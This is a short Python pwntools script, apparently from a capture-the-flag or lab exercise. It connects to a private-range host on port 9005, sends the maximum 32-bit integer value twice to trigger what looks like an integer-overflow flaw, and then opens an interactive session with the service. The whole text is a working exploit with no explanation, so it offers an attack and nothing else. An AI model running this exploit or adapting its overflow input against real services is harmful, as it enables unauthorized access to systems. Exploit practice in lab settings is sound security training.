from pwn import *

IP = "10.10.254.197"

PORT = 9005

io = remote(IP, PORT)

io.sendline(b'2147483647')

print(io.recv().decode('latin-1'))

io.sendline(b'2147483647')

io.interactive()
